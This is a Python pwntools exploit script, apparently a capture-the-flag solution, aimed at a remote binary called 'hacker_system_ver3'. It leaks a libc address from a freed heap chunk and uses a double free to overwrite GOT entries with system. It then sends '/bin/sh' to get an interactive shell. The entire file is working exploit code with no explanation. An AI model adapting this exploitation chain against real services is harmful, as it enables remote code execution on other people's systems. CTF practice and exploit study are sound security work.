from pwn import *

context.log_level = 'debug'
context.terminal = ['gnome-terminal', '-x', 'bash', '-c']

local = 0

if local:
    cn = process('./hacker_system_ver3')
    elf = ELF('./hacker_system_ver3')
    libc = ELF('./libc64.so')
else:
    cn = remote('111.230.149.72', 10014)
    elf = ELF('./hacker_system_ver3')
    libc = ELF('./libc64.so')

def z(a=''):
    gdb.attach(cn, a)
    if a == '':
        raw_input()

def add(name, age, intro):
    cn.sendline("1")
    cn.recv()
    cn.sendline(name)
    cn.recv()
    cn.sendline(str(age))
    cn.recv()
    cn.sendline(str(len(intro)))
    cn.recv()
    cn.sendline(intro)

def delete(name):
    cn.sendline("3")
    cn.recv()
    cn.sendline(name)

add("aaa", 123, "asd")
add("veritas501", 666, 'a' * 0x80)
add("aaa", 123, "asd")
add("veritas501", 666, 'a' * 0x80)
add("aaa", 123, "asd")

delete("veritas501")
cn.sendline("2")
cn.recv()
cn.sendline("veritas501")
cn.recvuntil("id:5")
cn.recvuntil("intro:")
libc_base = u64(cn.recv(6) + '\x00' * 2) - (0x3c4b20)
success(hex(libc_base))

add('bbb', 123, 'a'*0x20)
add('bbb', 123, 'a'*0x20)
add('bbb', 123, 'a'*0x20)
add('bbb', 123, 'a'*0x20)
add('bbb', 123, 'a'*0x20)
add('vvvvvv', 666, 'a'*0x30)
add('bbb', 123, 'asd')
add('vvvvvv', 666, 'a'*0x30)
add('bbb', 123, 'asd')


delete("vvvvvv")
delete("vvvvvv")
add("vvvvvv", str(0x602032), 'a')
add("vvvvvv", 123, 'a'*0x30)
add("vvvvvv", 123, 'a')

read = libc_base + libc.symbols['read']
system = libc_base + libc.symbols['system']
printf = libc_base + libc.symbols['printf']
payload = p64(printf)[2:] + p64(read) + p64(system)*10
add('\x00', 66666, payload[:0x30])

cn.sendline("2")
cn.recv()
cn.sendline("/bin/sh")

cn.interactive()
